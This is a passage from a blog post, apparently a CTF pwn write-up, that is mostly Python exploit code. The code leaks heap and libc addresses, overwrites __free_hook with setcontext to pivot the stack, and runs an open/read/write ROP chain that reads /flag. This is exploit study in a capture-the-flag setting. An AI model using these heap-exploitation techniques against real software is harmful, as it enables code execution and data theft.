class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        low13 = get_bits(value, <span class="number">0</span>, <span class="number">13</span>)</span><br><span class="line">        mid13 = get_bits(value, <span class="number">13</span>, <span class="number">26</span>)</span><br><span class="line">        mid13 ^= low13</span><br><span class="line">        high6 = get_bits(value, <span class="number">26</span>, <span class="number">32</span>)</span><br><span class="line">        high6 ^= get_bits(mid13, <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">        value = low13 + (mid13 &lt;&lt; <span class="number">13</span>) + (high6 &lt;&lt; <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">        high17 = get_bits(value, <span class="number">15</span>, <span class="number">32</span>)</span><br><span class="line">        low15 = get_bits(value, <span class="number">0</span>, <span class="number">15</span>)</span><br><span class="line">        low15 ^= get_bits(high17, <span class="number">2</span>, <span class="number">17</span>)</span><br><span class="line">        value = low15 + (high17 &lt;&lt; <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        first5 = get_bits(value, <span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        second5 = get_bits(value, <span class="number">5</span>, <span class="number">10</span>)</span><br><span class="line">        second5 ^= first5</span><br><span class="line">        third5 = get_bits(value, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        third5 ^= second5</span><br><span class="line">        fourth5 = get_bits(value, <span class="number">15</span>, <span class="number">20</span>)</span><br><span class="line">        fourth5 ^= third5</span><br><span class="line">        fifth5 = get_bits(value, <span class="number">20</span>, <span class="number">25</span>)</span><br><span class="line">        fifth5 ^= fourth5</span><br><span class="line">        sixth5 = get_bits(value, <span class="number">25</span>, <span class="number">30</span>)</span><br><span class="line">        sixth5 ^= fifth5</span><br><span class="line">        last2 = get_bits(value, <span class="number">30</span>, <span class="number">32</span>)</span><br><span class="line">        last2 ^= get_bits(sixth5, <span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        value = first5 + (second5 &lt;&lt; <span class="number">5</span>) + (third5 &lt;&lt; <span class="number">10</span>) + (fourth5 &lt;&lt; <span class="number">15</span>) + \</span><br><span class="line">            (fifth5 &lt;&lt; <span class="number">20</span>) + (sixth5 &lt;&lt; <span class="number">25</span>) + (last2 &lt;&lt; <span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>)                            <span class="comment"># chunk 0, used for leaking address</span></span><br><span class="line">chunk0_addr = show(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk0_addr))</span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># chunk #2~8</span></span><br><span class="line">chunk1_addr = chunk0_addr + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk1_addr + <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(chunk1_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(chunk1_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)                           <span class="comment"># chunk #9</span></span><br><span class="line">add(<span class="number">0x100</span>)                          <span class="comment"># chunk #10</span></span><br><span class="line">add(<span class="number">0x20</span>)                           <span class="comment"># chunk #11, goalkeeper</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x28</span>))               <span class="comment"># this can change the chunk #9&#x27;s size from 0x511 to 0x500</span></span><br><span class="line">edit(<span class="number">9</span>, cyclic(<span class="number">0x20</span>) + p64(<span class="number">0x810</span> + <span class="number">0x30</span> - <span class="number">0x10</span>))        <span class="comment"># write correct prev_size</span></span><br><span class="line">edit(<span class="number">10</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">8</span> - i)                   <span class="comment"># delete chunk #2~8</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">0xF0</span>)                       <span class="comment"># recover chunk #1, 2</span></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># recover chunk #3</span></span><br><span class="line">main_arena = show(<span class="number">3</span>) - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext = base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">openfile = base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readfile = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writefile = base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">poprdi_ret = base + <span class="number">0x23B6A</span></span><br><span class="line">poprsi_ret = base + <span class="number">0x2601F</span></span><br><span class="line">poprdx_ret = base + <span class="number">0x142C92</span></span><br><span class="line">addrsp0x18_ret = base + <span class="number">0x349ea</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #5</span></span><br><span class="line">edit(<span class="number">5</span>, cyclic(<span class="number">0xF0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(__free_hook))</span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #6</span></span><br><span class="line">add(<span class="number">0xF0</span>)                           <span class="comment"># chunk #7, to __free_hook</span></span><br><span class="line">edit(<span class="number">7</span>, p64(setcontext + <span class="number">0x3D</span>))     <span class="comment"># change __free_hook to setcontext + 0x3D, ready for stack pivoting</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xF0</span> + <span class="number">0x100</span>)                   <span class="comment"># chunk #8</span></span><br><span class="line">chunk8_addr = chunk1_addr + <span class="number">0x410</span></span><br><span class="line"></span><br><span class="line">ROP = <span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>)     <span class="comment"># 0x0</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x10</span>)          <span class="comment"># 0x30</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x38</span></span><br><span class="line">ROP += p64(<span class="number">2</span>)                           <span class="comment"># 0x40</span></span><br><span class="line">ROP += p64(openfile)                    <span class="comment"># 0x48</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x50</span></span><br><span class="line">ROP += p64(<span class="number">3</span>)                           <span class="comment"># 0x58</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0x60</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0x68</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0x70</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0x78</span></span><br><span class="line">ROP += p64(readfile)                    <span class="comment"># 0x80</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0x88</span></span><br><span class="line">ROP += p64(<span class="number">1</span>)                           <span class="comment"># 0x90</span></span><br><span class="line">ROP += p64(addrsp0x18_ret)              <span class="comment"># 0x98</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0x40</span>)          <span class="comment"># 0xA0</span></span><br><span class="line">ROP += p64(poprdi_ret)                  <span class="comment"># 0xA8</span></span><br><span class="line">ROP += p64(<span class="number">0xdeadbeef</span>)                  <span class="comment"># 0xB0</span></span><br><span class="line">ROP += p64(poprsi_ret)                  <span class="comment"># 0xB8</span></span><br><span class="line">ROP += p64(chunk8_addr + <span class="number">0xF0</span>)          <span class="comment"># 0xC0</span></span><br><span class="line">ROP += p64(poprdx_ret)                  <span class="comment"># 0xC8</span></span><br><span class="line">ROP += p64(<span class="number">0x30</span>)                        <span class="comment"># 0xD0</span></span><br><span class="line">ROP += p64(writefile)                   <span class="comment"># 0xD8</span></span><br><span class="line">edit(<span class="number">8</span>, ROP)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">79</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
